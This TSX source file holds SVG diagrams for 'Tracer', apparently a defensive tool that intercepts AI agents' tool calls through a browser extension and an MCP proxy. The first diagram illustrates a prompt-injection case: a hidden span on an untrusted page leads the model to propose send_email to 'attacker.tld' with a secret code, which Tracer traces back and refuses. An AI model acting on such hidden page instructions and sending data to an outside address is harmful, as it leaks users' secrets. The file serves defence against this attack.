// ---------------------------------------------------------------------------
// Tracer's diagrams.
//
// The mechanism this project defends against is invisible by construction: a
// hidden instruction, a plausible tool call, a destination nobody looked at.
// Prose has to assert that chain. A drawing can show it.
//
// All four use the .d-* vocabulary already in styles.css, so they retheme with
// the rest of the system and never carry their own colours. Acid marks the one
// thing the viewer should look at; everything else is bone.
//
// Every diagram is role="img" with a full aria-label, because a screen reader
// user gets nothing at all from an SVG otherwise.
// ---------------------------------------------------------------------------

/**
 * ARTIFACT: the provenance chain.
 *
 * The causal line from a span nobody can see to a call that does not go. This
 * is the whole product in one picture: the argument to the tool call is traced
 * back to its origin, and the origin is what disqualifies it.
 */
export function ChainDiagram() {
  return (
    <div
      className="diagram"
      role="img"
      aria-label="A hidden span on an untrusted page becomes text the model reads, which becomes an argument in a proposed tool call. Tracer traces that argument back to the concealed span, finds a destination the user never named, and refuses the call."
    >
      <svg viewBox="0 0 980 240" preserveAspectRatio="xMidYMid meet">
        <defs>
          <marker id="tip" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
            <path d="M 0 0 L 10 5 L 0 10 z" className="d-tip" />
          </marker>
        </defs>

        {/* 1. the page, with the concealed span inside it */}
        <text x="0" y="26" className="d-step">01 / UNTRUSTED PAGE</text>
        <rect x="0" y="40" width="200" height="104" className="d-plate" />
        <line x1="18" y1="66" x2="150" y2="66" className="d-ruleline" />
        <line x1="18" y1="82" x2="172" y2="82" className="d-ruleline" />
        {/* the payload: the only acid thing on this side */}
        <rect x="18" y="94" width="164" height="26" className="d-hot" />
        <text x="27" y="111" className="d-hot-label">
          hidden span #a4f
        </text>
        <line x1="18" y1="132" x2="120" y2="132" className="d-ruleline" />

        <path d="M 210 92 L 268 92" className="d-wire" markerEnd="url(#tip)" />

        {/* 2. the model reads it and proposes a call */}
        <text x="278" y="26" className="d-step">02 / THE MODEL READS IT</text>
        <rect x="278" y="40" width="212" height="104" className="d-plate" />
        <text x="294" y="70" className="d-code">send_email(</text>
        <text x="306" y="92" className="d-code">to: attacker.tld,</text>
        {/* the argument that will be traced */}
        <text x="306" y="114" className="d-code hot">body: &quot;code 4471&quot;</text>
        <text x="294" y="134" className="d-code">)</text>

        <path d="M 500 92 L 558 92" className="d-wire" markerEnd="url(#tip)" />

        {/* 3. tracer evaluates */}
        <rect x="568" y="40" width="196" height="104" className="d-box" />
        <text x="588" y="76" className="d-box-title">TRACER</text>
        <text x="588" y="100" className="d-box-sub">trace every argument</text>
        <text x="588" y="120" className="d-box-sub">judge the destination</text>

        <path d="M 774 92 L 832 92" className="d-wire" markerEnd="url(#tip)" />

        {/* 4. the outcome */}
        <rect x="842" y="66" width="128" height="52" className="d-hot" />
        <text x="864" y="98" className="d-hot-label lg">
          REFUSED
        </text>

        {/* the trace: from the argument back to the span it came from. Dashed,
            because it is an inference Tracer draws rather than a data path. */}
        <path
          d="M 306 122 C 306 190, 100 190, 100 130"
          className="d-trace"
          markerEnd="url(#tip)"
        />
        <text x="336" y="196" className="d-trace-label">
          traced back to a span the user never saw
        </text>
      </svg>
    </div>
  );
}

/**
 * ARTIFACT: the MCP proxy.
 *
 * The version this replaces drew four labels and three lines, and left out the
 * only interesting part: a refused call stops AT the proxy. Upstream is never
 * reached, which is the difference between a firewall and a logger.
 */
export function ProxyDiagram() {
  const upstream = ['gmail', 'fetch', 'jira', 'slack'];
  return (
    <div
      className="diagram"
      role="img"
      aria-label="An agent client connects to the Tracer proxy instead of directly to its MCP servers. The proxy forwards allowed calls upstream to gmail, fetch, jira and slack, holds some for review, and refuses others. A refused call terminates at the proxy and never reaches the upstream server."
    >
      <svg viewBox="0 0 980 300" preserveAspectRatio="xMidYMid meet">
        <defs>
          <marker id="tip2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
            <path d="M 0 0 L 10 5 L 0 10 z" className="d-tip" />
          </marker>
        </defs>

        {/* the client */}
        <rect x="0" y="86" width="168" height="62" className="d-plate" />
        <text x="20" y="114" className="d-host">agent client</text>
        <text x="20" y="134" className="d-sub">claude desktop, cursor…</text>

        <path d="M 178 117 L 256 117" className="d-wire" markerEnd="url(#tip2)" />
        <text x="186" y="106" className="d-sub">tool call</text>

        {/* the proxy */}
        <rect x="266" y="72" width="216" height="90" className="d-box" />
        <text x="288" y="108" className="d-box-title">tracer-proxy</text>
        <text x="288" y="134" className="d-box-sub">evaluate(call, ctx)</text>

        {/* allowed: straight through to upstream */}
        <path d="M 492 100 L 640 100" className="d-wire" markerEnd="url(#tip2)" />
        <text x="508" y="90" className="d-verdict allow">ALLOW</text>

        {upstream.map((name, i) => (
          <g key={name}>
            <rect x="650" y={40 + i * 46} width="150" height="34" className="d-plate" />
            <text x="668" y={62 + i * 46} className="d-sub strong">
              {name}
            </text>
          </g>
        ))}
        <path d="M 640 100 L 640 57 L 650 57" className="d-wire" />
        <path d="M 640 100 L 640 103 L 650 103" className="d-wire" />
        <path d="M 640 100 L 640 149 L 650 149" className="d-wire" />
        <path d="M 640 100 L 640 195 L 650 195" className="d-wire" />
        <text x="650" y="238" className="d-sub">your real MCP servers</text>

        {/* held */}
        <path d="M 374 172 L 374 206 L 470 206" className="d-wire" markerEnd="url(#tip2)" />
        <text x="480" y="211" className="d-verdict hold">HOLD</text>
        <text x="544" y="211" className="d-sub">waits for you</text>

        {/* refused: terminates at the proxy. The stop bar is the point of the
            whole drawing -- nothing continues to the right of it. */}
        <path d="M 340 172 L 340 258 L 470 258" className="d-wire dim" />
        <rect x="470" y="244" width="104" height="28" className="d-hot" />
        <text x="486" y="263" className="d-hot-label">REFUSED</text>
        <text x="590" y="263" className="d-sub">upstream never called</text>
      </svg>
    </div>
  );
}

/**
 * The core contract: three hosts in, one decision out. Kept from the previous
 * landing page because it was already the right picture -- redrawn to match the
 * others and to name what each host can and cannot see.
 */
export function CoreDiagram() {
  const hosts = [
    { name: 'browser extension', note: 'full visibility analysis' },
    { name: 'MCP proxy', note: 'no DOM, says so' },
    { name: 'sandbox', note: 'the demo you just watched' },
  ];
  return (
    <div
      className="diagram"
      role="img"
      aria-label="The browser extension, the MCP proxy and the sandbox all call the same tracer-core evaluate function, which returns a decision and a provenance chain."
    >
      <svg viewBox="0 0 980 230" preserveAspectRatio="xMidYMid meet">
        <defs>
          <marker id="tip3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
            <path d="M 0 0 L 10 5 L 0 10 z" className="d-tip" />
          </marker>
        </defs>

        {hosts.map((h, i) => {
          const y = 42 + i * 58;
          return (
            <g key={h.name}>
              <text x="0" y={y} className="d-host sm">
                {h.name}
              </text>
              <text x="0" y={y + 17} className="d-sub">
                {h.note}
              </text>
              <path d={`M 232 ${y - 5} L 300 ${y - 5} L 300 115`} className="d-wire" />
            </g>
          );
        })}

        <path d="M 300 115 L 372 115" className="d-wire" markerEnd="url(#tip3)" />

        <rect x="382" y="76" width="306" height="80" className="d-box" />
        <text x="406" y="112" className="d-box-title">tracer-core</text>
        <text x="406" y="136" className="d-box-sub">evaluate(call, ctx)</text>

        <path d="M 698 115 L 766 115" className="d-wire" markerEnd="url(#tip3)" />
        <text x="778" y="108" className="d-out">decision</text>
        <text x="778" y="132" className="d-out">+ provenance chain</text>
      </svg>
    </div>
  );
}
